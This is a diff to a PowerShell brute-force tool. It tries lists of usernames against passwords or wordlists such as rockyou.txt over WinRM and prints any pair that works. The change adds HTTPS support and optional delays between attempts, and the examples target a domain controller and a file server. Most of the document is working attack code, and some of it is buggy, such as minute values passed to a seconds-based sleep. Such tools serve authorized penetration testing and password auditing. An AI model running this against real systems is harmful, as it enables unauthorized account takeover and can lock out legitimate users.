@@ -8,7 +8,16 @@ Brute force credentials of a user or list of users and a password or list of pas
 
 
 .PARAMETER ComputerName
-This parameter defines a single remote device or list of remote devices to test credentials against
+This parameter defines a single remote device to test credentials against
+
+.PARAMETER UseSSL
+This switch parameter indicates that WinRM over HTTPS should be used to test credential validation
+
+.PARAMETER SleepSeconds
+Defines the number of seconds that should pass before attempting the next set of credentials
+
+.PARAMETER SleepMinutes
+Defines the number of minutes that should pass before attempting the next set of credentials
 
 .PARAMETER Username
 This parameter defines a single username or a list of usernames against the passwords you define
@@ -21,6 +30,15 @@ This parameter defines a single password to test against the users you define
 
 .PARAMETER PassFile
 This parameter defines a file containng a list of passwords
+
+
+.EXAMPLE
+Test-BruteForceCredentials -ComputerName DC01.domain.com -UseSSL -Username 'admin','administrator' -Passwd 'Password123!' -SleepMinutes 5
+# This example will test the one password defined against both the admin and administrator users on the remote computer DC01.domain.com using WinRM over HTTPS with a time interval of 5 minutes between each attempt
+
+.EXAMPLE
+Test-BruteForceCredentials -ComputerName File.domain.com -UserFile C:\Temp\users.txt -PassFile C:\Temp\rockyou.txt 
+# This example will test every password in rockyou.txt against every username in the users.txt file without any pause between tried attempts
 
 
 .NOTES
@@ -48,126 +66,107 @@ System.String, System,Array
 PSCustomObject
 		
 #>
-Function Test-BruteForceCredentials.ps1 {
+Function Test-BruteForceCredentials {
     [CmdletBinding()]
         param(
             [Parameter(
-                Mandatory=$False,
+                Mandatory=$True,
                 ValueFromPipeline=$True,
-                ValueFromPipelineByPropertyName=$False
-            )]  # End Parameter
-            [String[]]$ComputerName,
+                ValueFromPipelineByPropertyName=$False,
+                HelpMessage="`n[H] Define a device on the network to test credentials against `n[E] EXAMPLE: test.domain.com")]  # End Parameter
+            [String]$ComputerName,
 
             [Parameter(
-                ParameterSetName="Username",
-                Mandatory=$True
+                Mandatory=$False
             )]  # End Parameter
+            [Switch][Bool]$UseSSL,
+
             [Parameter(
-                ParameterSetName="Password",
-                Mandatory=$True
+                Mandatory=$False,
+                ValueFromPipeline=$False
             )]  # End Parameter
+            [Int64]$SleepSeconds,
+
             [Parameter(
-                ParameterSetName="PassFile",
-                Mandatory=$True
+                Mandatory=$False,
+                ValueFromPipeline=$False
+            )]  # End Parameter
+            [Int64]$SleepMinutes,
+
+            [Parameter(
+                Mandatory=$False
             )]  # End Parameter
             [String[]]$Username,
 
             [Parameter(
-                ParameterSetName="UserFile",
-                Mandatory=$True
-            )]  # End Parameter
-            [Parameter(
-                ParameterSetName="Password",
-                Mandatory=$True
-            )]  # End Parameter
-            [Parameter(
-                ParameterSetName="PassFile",
-                Mandatory=$True
+                Mandatory=$False
             )]  # End Parameter
             [String]$UserFile,
 
             [Parameter(
-                ParameterSetName="UserFile",
-                Mandatory=$True
-            )]  # End Parameter
-            [Parameter(
-                ParameterSetName="Username",
-                Mandatory=$True
-            )]  # End Parameter
-            [Parameter(
-                ParameterSetName="Password",
-                Mandatory=$True
+                Mandatory=$False
             )]  # End Parameter
             [String[]]$Passwd,
 
             [Parameter(
-                ParameterSetName="UserFile",
-                Mandatory=$True
-            )]  # End Parameter
-            [Parameter(
-                ParameterSetName="Username",
-                Mandatory=$True
-            )]  # End Parameter
-            [Parameter(
-                ParameterSetName="PassFile",
-                Mandatory=$True
+                Mandatory=$False
             )]  # End Parameter
             [String]$PassFile)  # End param
 
-
-    Switch ($PSBoundParameters.Keys)
+    
+    If ($PSBoundParameters.Keys -eq 'Username')
     {
 
-        'Username' {
+        Write-Verbose "Username ParameterSet being used"
 
-            Write-Verbose "Username ParameterSet being used"
+        [array]$UserList = $Username
 
-            [array]$UserList = $Username
-
-        }  # End Username Switch
-
-        'UserFile' {
-
-            Write-Verbose "UserFile ParameterSet being used"
-
-            $UserList = Get-Content -Path $UserFile
-            ForEach ($User in $UserList) 
-            {
-            
-                $UserList += $User
+    }  # End If
+    ElseIf ($PSBoundParameters.Keys -eq 'UserFile')
+    {
         
-            }  # End ForEach
+        Write-Verbose "UserFile ParameterSet being used"
+
+        $UserList = Get-Content -Path $UserFile
+        ForEach ($User in $UserList) 
+        {
+            
+            $UserList += $User
+        
+        }  # End ForEach
             
 
-        }  # End UserFile Switch
+    }  # End ElseIf
 
-        'Password' {
 
-            Write-Verbose "Passwd ParameterSet being used"
+    If ($PSBoundParameters.Keys -eq 'Passwd')
+    {
 
-            [array]$PassList = $Passwd
+        Write-Verbose "Passwd ParameterSet being used"
 
-        }  # End Password Switch
+        [array]$PassList = $Passwd
 
-        'PassFile' {
+    }  # End Password Switch
+    ElseIf ($PSBoundParameters.Keys -eq 'PassFile')
+    {
 
-            Write-Verbose "PassFile ParameterSet being used"
+        Write-Verbose "PassFile ParameterSet being used"
+
+        $PassList = Get-Content -Path $PassFile
+        ForEach ($P in $PassList) 
+        {
             
-            $PassList = Get-Content -Path $PassFile
-            ForEach ($P in $passwordstotry) 
-            {
+            $Passwd += $P
             
-                $Passwd += $p 
-            
-            }  # End ForEach
+        }  # End ForEach
 
 
-        }  # End PassFile Switch
-
-    }  # End Switch
+    }  # End ElseIf
 
     ForEach ($U in $UserList) 
     {
+
+        Write-Verbose "Testing passwords for $U"
 
         ForEach ($P in $PassList) 
         {
@@ -175,27 +174,60 @@ Function Test-BruteForceCredentials.ps1 {
             $Error.Clear()
         
             $Credentials = @()
-            $ClearTextPassword = ""
           
             $SecurePassword = ConvertTo-SecureString -String $P -AsPlainText -Force
             $AttemptCredentials = New-Object -TypeName System.Management.Automation.PSCredential($U, $SecurePassword)
                 
-            $Result = Test-WSMan -ComputerName $ComputerName -Credential $AttemptCredentials -Authentication Negotiate -ErrorAction SilentlyContinue
+            If ($UseSSL.IsPresent)
+            {
+                
+                If ($PSBoundParameters.Keys -eq "SleepSeconds")
+                {
+                    
+                    Start-Sleep -Seconds $SleepSeconds
+
+                }  # End If
+                ElseIf ($PSBoundParameters.Keys -eq "SleepMinutes")
+                {
+                    
+                    Start-Sleep -Seconds $SleepMinutes
+
+                }  # End ElseIf
+
+                $Result = Test-WSMan -UseSSL -ComputerName $ComputerName -Credential $AttemptCredentials -Authentication Negotiate -ErrorAction SilentlyContinue
+
+            }  # End If
+            Else 
+            {
         
-        
+                If ($PSBoundParameters.Keys -eq "SleepSeconds")
+                {
+                    
+                    Start-Sleep -Seconds $SleepSeconds
+
+                }  # End If
+                ElseIf ($PSBoundParameters.Keys -eq "SleepMinutes")
+                {
+                    
+                    Start-Sleep -Seconds $SleepMinutes
+
+                }  # End ElseIf
+
+                $Result = Test-WSMan -ComputerName $ComputerName -Credential $AttemptCredentials -Authentication Negotiate -ErrorAction SilentlyContinue
+
+            }  # End Else
+
            If ($Null -eq $Result) 
            {
         
-                Write-Output "Testing Password: $p = Failed"
-                
-                $ClearTextPassword = $Null
+                Write-Verbose "[*] Testing Password: $P = Failed"
         
             }  # End If 
             Else 
             {
         
 
-                $Credentials += "USER: $U`n PASS: $P`n"
+                $Credentials += "USER: $U`nPASS: $P`n"
 
                 Write-Output "SUCCESS: `n$Credentials`n"
                 
@@ -208,7 +240,7 @@ Function Test-BruteForceCredentials.ps1 {
     If ($Null -eq $Credentials) 
     {
 
-        Write-Output "None of the define passwords were found to be correct"
+        Write-Output "FAILED: None of the defined passwords were found to be correct"
 
     }  # End Else
 
